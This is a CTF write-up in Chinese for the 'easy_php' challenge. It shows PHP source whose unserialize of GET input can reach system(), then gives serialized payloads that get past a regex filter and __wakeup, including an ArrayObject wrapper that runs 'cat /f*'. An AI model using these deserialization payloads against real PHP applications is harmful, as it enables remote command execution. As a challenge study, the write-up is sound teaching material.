## easy_php

题目源码如下

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-03-24 10:16:33
# @Last Modified by:   h1xa
# @Last Modified time: 2023-03-25 00:25:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }

}

$data = $_GET['1+1>2'];

if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}

?>
```

一开始想的是通过填充恶意字符 bypass 没打通，但是在本地是可以的

```php
$temp = new ctfshow();
$temp->ctfshow = 'whoami';
echo serialize($temp);
```

生成的 payload 为 `O:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}`，填充加号进去，所以 payload 就成为了

```php
O:%2B7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}
```

但是题目环境没打通，发现其实是 PHP 版本问题，所以换了一种打法。

{% asset_img easy_phpLocal.png %}

- 题目目前是正则匹配不了 `O`，也就是类，但是我们要去反序列化，没办法避开这点，这就用到了最开始反序列化的时候学过的骚姿势，用 ArrayList bypass

考点：PHP7.3 `__wakeup` 绕过，ArrayObject 内置类
众所周知可以使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要用属性命令执行就不行了
这种情况我们可以用内置类 **ArrayObject**

payload 如下

```php
$a=new ctfshow;
$a->ctfshow="cat /f*";
$arr=array("temp"=>$a);
$oa=new ArrayObject($arr);
$res=serialize($oa);
echo $res;
```

打通了

{% asset_img easy_php_flag.png %}

